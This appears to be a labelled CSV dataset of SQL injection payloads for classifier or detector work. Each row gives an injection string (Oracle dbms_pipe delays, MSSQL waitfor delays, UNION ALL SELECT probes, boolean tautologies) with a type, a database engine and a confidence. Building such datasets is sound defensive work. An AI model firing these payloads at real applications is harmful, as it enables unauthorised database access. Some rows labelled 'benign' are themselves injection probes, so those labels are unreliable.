id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1615,"1"" ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1767,"1 ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 8554 = 8554",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1769,"1' ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1788,"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) -- pvdw",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1611,waitfor delay '0:0:5'-- thuo,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1616,1 ) where 8320 = 8320 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1638,( case when 6398 = 6398 then 1 else null end ),benign,generic,0.9,Signals: 'case'. Payload length: 46 chars.,2
1642,"1' ) as taay where 7027 = 7027 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
1666,"1 ) ) as cbdx where 8998 = 8998 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
1698,1' ) waitfor delay '0:0:5' and ( 'vtfs' = 'vtfs,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1721,"waitfor delay '0:0:5' and ""%"" = """,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1728,1%' waitfor delay '0:0:5' and '%' = ',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1733,"1', ( case when 8260 = 8260 then 1 else null end )",benign,generic,0.9,Signals: 'case'. Payload length: 50 chars.,2
1745,waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1748,"iif ( 8214 = 4954,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
1757,"1'|| ( select 'jnsd' from dual where 2316 = 2316 union all select null,null,null,null,null,null,null#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
1778,"waitfor delay '0:0:5' and ( ( ( ""mfro"" like ""mfro",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1604,1' and 9970 = 3409,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 18 chars.,2
1608,"1"" ) ) ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
1612,"-2929"" ) ) ) union all select 8999,8999#",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
1619,"-5313"" ) ) ) union all select 9189,9189,9189,9189,9189,9189,9189,9189--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
1621,"-4772 ) ) ) union all select 3879,3879,3879,3879,3879--",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
1623,1' and 7528 = 2894 and 'qoyw' = 'qoyw,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
1627,"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
1628,"1"" and 9198 = 9198--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
1629,1 ) as azoo where 8933 = 8933 and ( 3020 = 3020 ) *6703--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 57 chars.,2
1633,"-6007"" ) ) union all select 6019,6019,6019,6019,6019,6019,6019,6019--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
1634,"-9439"" ) where 9460 = 9460 or ( 9497 = 9586 ) *9586--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,2
1635,"1%' ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
1639,1' and 7533 = 7533 and 'frvk' = 'frvk,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
1640,"-5362 ) union all select 7297,7297,7297,7297,7297#",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
1643,-8234' ) ) ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
1652,"1%"" ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
1653,"-6389"" union all select 2355,2355,2355,2355,2355--",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
1658,"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
1660,"-2896' ) ) as wisk where 1030 = 1030 union all select 1030,1030,1030,1030#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
1663,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
1665,-3044' ) or 4999 = 3051#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
1669,-1700%' or 4149 = 3391#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
1674,"1%' ) ) ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,2
1676,-9739' or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
1681,"-9179"" ) union all select 7144,7144,7144,7144,7144,7144,7144,7144--",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
1684,"1"" ) as qayu where 6222 = 6222 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
1685,"1 ) union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
1692,"-3737%"" union all select 4452,4452,4452#",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
1693,1' ) ) and 3814 = 4272--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
1699,"-8238' ) ) union all select 9797,9797,9797,9797,9797,9797,9797,9797#",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
1700,-8504 where 3086 = 3086 or 1131 = 9188#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
1701,1 where 6036 = 6036 and 7533 = 7533--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
1703,-8409 ) ) as ipbz where 9984 = 9984 or 3371 = 3869,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
1705,"1"" ) where 4822 = 4822 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 91 chars.,2
1707,"1' ) ) union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
1708,"-6611%"" ) ) ) union all select 8918,8918#",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
1711,"-9156' ) ) union all select 9110,9110,9110,9110#",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
1723,"1%"" ) ) ) union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 42 chars.,2
